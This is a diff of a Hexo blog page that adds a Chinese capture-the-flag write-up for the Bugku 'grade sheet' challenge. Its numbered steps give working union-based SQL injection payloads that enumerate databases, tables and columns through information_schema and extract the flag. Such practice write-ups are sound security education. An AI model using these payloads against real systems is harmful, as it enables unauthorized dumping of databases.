@@ -6,18 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://unln1999.github.io/unln1999.github.io">
-  <title>Tag: 网站 | 夢の此夜亭🌸</title>
+  <title>Bugku 2019/10/8 成绩单 | 夢の此夜亭🌸</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录CTF学习之路上的各种收获，和同学们分享，共同进步~">
-<meta property="og:type" content="website">
-<meta property="og:title" content="夢の此夜亭🌸">
-<meta property="og:url" content="https://unln1999.github.io/unln1999.github.io/tags/网站/index.html">
+  <meta name="description" content="进入题目页面显然是sql注入 思路writeup 输入1’，输出不正常，1’#,输出正常。应该是字符型输出。  输入1’ or 1# 只输出一个，可见输出受限。  输入一个没有数据的id，在用union select暴库。  输入4’ union select 1,2,3,4#（1、2、3、4是一个个试过来的，得到字段数，用order by 报错被抑制）  输入4’ union select da">
+<meta name="keywords" content="bugku">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku 2019&#x2F;10&#x2F;8 成绩单">
+<meta property="og:url" content="https://unln1999.github.io/unln1999.github.io/2019/10/08/bk20-成绩单/index.html">
 <meta property="og:site_name" content="夢の此夜亭🌸">
-<meta property="og:description" content="记录CTF学习之路上的各种收获，和同学们分享，共同进步~">
+<meta property="og:description" content="进入题目页面显然是sql注入 思路writeup 输入1’，输出不正常，1’#,输出正常。应该是字符型输出。  输入1’ or 1# 只输出一个，可见输出受限。  输入一个没有数据的id，在用union select暴库。  输入4’ union select 1,2,3,4#（1、2、3、4是一个个试过来的，得到字段数，用order by 报错被抑制）  输入4’ union select da">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-10T14:44:31.998Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="夢の此夜亭🌸">
-<meta name="twitter:description" content="记录CTF学习之路上的各种收获，和同学们分享，共同进步~">
+<meta name="twitter:title" content="Bugku 2019&#x2F;10&#x2F;8 成绩单">
+<meta name="twitter:description" content="进入题目页面显然是sql注入 思路writeup 输入1’，输出不正常，1’#,输出正常。应该是字符型输出。  输入1’ or 1# 只输出一个，可见输出受限。  输入一个没有数据的id，在用union select暴库。  输入4’ union select 1,2,3,4#（1、2、3、4是一个个试过来的，得到字段数，用order by 报错被抑制）  输入4’ union select da">
   
     <link rel="alternative" href="/atom.xml" title="夢の此夜亭🌸" type="application/atom+xml">
   
@@ -146,60 +148,202 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-bk20-成绩单" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/unln1999.github.io/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/unln1999.github.io/2019/09/12/1建立博客/" class="archive-article-date">
-  	<time datetime="2019-09-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-12</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/unln1999.github.io/2019/09/12/1建立博客/">Win10利用Github+Hexo建个人博客</a>
+    <h1 class="article-title" itemprop="name">
+      Bugku 2019/10/8 成绩单
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/unln1999.github.io/2019/10/08/bk20-成绩单/" class="archive-article-date">
+  	<time datetime="2019-10-07T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>显然是sql注入</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>输入1’，输出不正常，1’#,输出正常。应该是字符型输出。</p>
+</li>
+<li><p>输入1’ or 1# 只输出一个，可见输出受限。</p>
+</li>
+<li><p>输入一个没有数据的id，在用union select暴库。</p>
+</li>
+<li><p>输入4’ union select 1,2,3,4#<br>（1、2、3、4是一个个试过来的，得到字段数，用order by 报错被抑制）</p>
+</li>
+<li><p>输入4’ union select database(),2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到数据库中的表。</p>
+</li>
+<li><p>输入4’ union select database(),2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p>
+</li>
+<li><p>输入4’ union select database(),2,3,group_concat(skctf_flag) from skctf_flag.fl4g#<br>得到flag。</p>
+</li>
+</ol>
+<p>附：暴库 4’ union select database(),2,3,group_concat(schema_name) from information_schema.schemata#</p>
+<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
+<li><strong>SQL注入</strong></li>
+<li><strong>group_concat</strong></li>
+<li><strong>暴库、暴表、暴字段</strong></li>
+<li><strong>information_schema.schemata</strong></li>
+<li><strong>information_schema.tables where table_schema=’’</strong></li>
+<li><strong>information_schema.columns where table_name=’’</strong></li>
+</ol>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖糖╰(*°▽°*)╯<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/wechat.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网站</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://unln1999.github.io/unln1999.github.io/2019/10/08/bk20-成绩单/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/unln1999.github.io/2019/10/07/DVWAXSS/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DVWA-XSS全解</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -222,9 +366,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
